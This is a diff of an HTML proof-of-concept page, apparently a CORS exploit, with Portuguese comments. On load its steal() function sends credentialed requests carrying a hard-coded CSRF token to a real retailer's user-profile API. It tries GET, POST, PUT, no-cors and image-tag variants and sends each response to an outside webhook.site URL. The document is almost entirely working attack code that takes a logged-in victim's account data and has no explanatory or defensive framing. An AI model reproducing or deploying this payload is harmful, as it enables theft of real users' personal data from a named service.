@@ -2,25 +2,84 @@
 <meta charset="utf-8">
 <title>exp-cors</title>
 <script>
-  // callback de exfiltração (pode salvar em https://webhook.site se quiser)
-  const HOOK = 'https://rcepoc.requestcatcher.com';
+  const HOOK = 'https://webhook.site/adf2fe42-6019-4297-b27a-ca8bf04acf73';  // ← sua webhook
 
-  // helpers
   function log(txt){
-     fetch(HOOK, {method:'POST', mode:'no-cors', body: txt}).catch(()=>{});
+    fetch(HOOK,{method:'POST', mode:'no-cors', body:txt}).catch(()=>{});
   }
 
   function steal(){
-     log('init');
-     fetch('https://www.expert.de/api/user/profile',{
+    log('init');
+
+    /* 1)──── CORS comum + lê body (mais útil) ────*/
+    fetch('https://www.expert.de/api/user/profile',{
+       method:'GET',
        credentials:'include',
-       headers:{'csrf-token':'1e206742-fb4a-44d2-8174-be9b2e2d6425'}
-     })
-     .then(r => r.text())
-     .then(d => log(d))
-     .catch(e => log('erro:'+e));
+       headers:{'csrf-token':'1e206742-fb4a-44d2-8174-be9b2e2d6425'},
+       mode:'cors'
+    })
+    .then(r => r.status+' '+r.statusText + '\n' + r.headers.get('content-type'))
+    .then(t => log('V1: '+t))
+    .catch(e => log('V1-err:'+e));
+
+    /* 2)──── idem, mas captura body se CORS permitir ────*/
+    fetch('https://www.expert.de/api/user/profile',{
+       method:'GET',
+       credentials:'include',
+       headers:{'csrf-token':'1e206742-fb4a-44d2-8174-be9b2e2d6425'},
+       mode:'cors'
+    })
+    .then(async r => 'STATUS:'+r.status+' BODY:'+await r.text().catch(()=>'[bloqueado]'))
+    .then(t => log('V2: '+t))
+    .catch(e => log('V2-err:'+e));
+
+    /* 3)──── no-cors (body inacessível) só status/type ────*/
+    fetch('https://www.expert.de/api/user/profile',{
+       method:'GET',
+       credentials:'include',
+       headers:{'csrf-token':'1e206742-fb4a-44d2-8174-be9b2e2d6425'},
+       mode:'no-cors'
+    })
+    .then(r => 'TYPE:'+r.type+' STATUS:'+(r.status||'opaquo'))
+    .then(t => log('V3: '+t))
+    .catch(e => log('V3-err:'+e));
+
+    /* 4)──── POST JSON simples (testa outro verbo) ────*/
+    fetch('https://www.expert.de/api/user/profile',{
+       method:'POST',
+       credentials:'include',
+       headers:{
+          'csrf-token':'1e206742-fb4a-44d2-8174-be9b2e2d6425',
+          'content-type':'application/json'
+       },
+       mode:'cors',
+       body:JSON.stringify({ping:'pong'})
+    })
+    .then(r => 'POST '+r.status)
+    .then(t => log('V4: '+t))
+    .catch(e => log('V4-err:'+e));
+
+    /* 5)──── PUT com texto puro ────*/
+    fetch('https://www.expert.de/api/user/profile',{
+       method:'PUT',
+       credentials:'include',
+       headers:{
+          'csrf-token':'1e206742-fb4a-44d2-8174-be9b2e2d6425',
+          'content-type':'text/plain'
+       },
+       mode:'cors',
+       body:'raw text test'
+    })
+    .then(r => 'PUT '+r.status)
+    .then(t => log('V5: '+t))
+    .catch(e => log('V5-err:'+e));
+
+    /* 6)──── img tag para ping booleano (no-js fallback) ────*/
+    const i=new Image();
+    i.src='https://www.expert.de/api/user/profile?cache='+Date.now();
+    i.onload =()=>log('V6-img:ok');
+    i.onerror=()=>log('V6-img:fail');
   }
 
-  // roda automaticamente após carregar
   window.onload = steal;
 </script>
